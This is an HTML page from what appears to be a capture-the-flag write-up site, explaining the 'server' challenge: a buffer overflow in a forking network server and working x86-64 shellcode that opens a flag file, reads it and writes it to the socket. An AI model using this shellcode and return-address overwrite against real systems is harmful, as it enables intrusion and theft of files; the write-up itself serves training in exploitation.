@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>server - Cyberchallenge Writeups</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <link href="../../css/custom-styles.css" rel="stylesheet">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "server", url: "#_top", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script>
+      <script src="../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../benchmarking/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../benchmarking/" class="btn btn-xs btn-link">
+        benchmarking_service
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../lost_in_memory/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../lost_in_memory/" class="btn btn-xs btn-link">
+        lost_in_memory
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="server">server</h1>
+<p>This challenge is very similar to the <a href="../onlyreadwrite/">Only Read Write</a> challenge. The only difference is that the binary now is a server that listens on a port and forks a child process that reads in a buffer. Then we have to write not on stdout but on the socket file descriptor.</p>
+<pre><code class="language-c">    mov r12, rdi
+    mov rax, 0x101010101010101
+    push rax
+    mov rax, 0x101010101010101 ^ 0x67616c662f2e
+    xor [rsp], rax
+    mov rdi, rsp
+    xor edx, edx /* 0 */
+    xor esi, esi /* 0 */
+    /* call open() */
+    push SYS_open /* 2 */
+    pop rax
+    syscall
+    /* call read(fd_open, 'rsp', 0x64) */
+    push rax
+    xor eax, eax /* SYS_read */
+    pop rdi
+    push 0x64
+    pop rdx
+    mov rsi, rsp
+    syscall
+    /* write(fd_socket, buf='rsp', n=0x64) */
+    push r12
+    pop rdi
+    push 0x64
+    pop rdx
+    mov rsi, rsp
+    /* call write() */
+    push SYS_write /* 1 */
+    pop rax
+    syscall
+</code></pre>
+<p>In this case I used R12 to store the socket file descriptor. The shellcode is the same as the previous challenge, except for the write part were we put R12 in RDI, and then we call write.</p>
+<p>The process forked from the server executes this function</p>
+<pre><code class="language-c">void prog(int socket_fd) {
+  size_t n;
+  char name [1008];
+
+  get_name(socket_fd, name);
+  write(socket_fd, &quot;Hello Mr.&quot;, 9);
+  n = strlen(name);
+  write(socket_fd, name, n);
+  return;
+}
+</code></pre>
+<p>get_name() is reading 4096 bytes in a buffer of 1008 bytes, so we have a buffer overflow. We overflow the buffer with the shellcode and modify the return address to point to it. We know the address of the shellcode because it is in the .bss section and the binary is not PIE.</p>
+<p>The complete exploit is in <a href="script.py">script.py</a>.</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../benchmarking/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../benchmarking/" class="btn btn-xs btn-link">
+        benchmarking_service
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../lost_in_memory/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../lost_in_memory/" class="btn btn-xs btn-link">
+        lost_in_memory
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content">
+      <p>
+        <a href="https://github.com/gio-del/ODC-Challenges-CTF/edit/main/shellcode/server/README.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gio-del/ODC-Challenges-CTF">Windmill Dark</a> theme by None (noraj).</p>
+</footer>
+
+</body>
+</html>
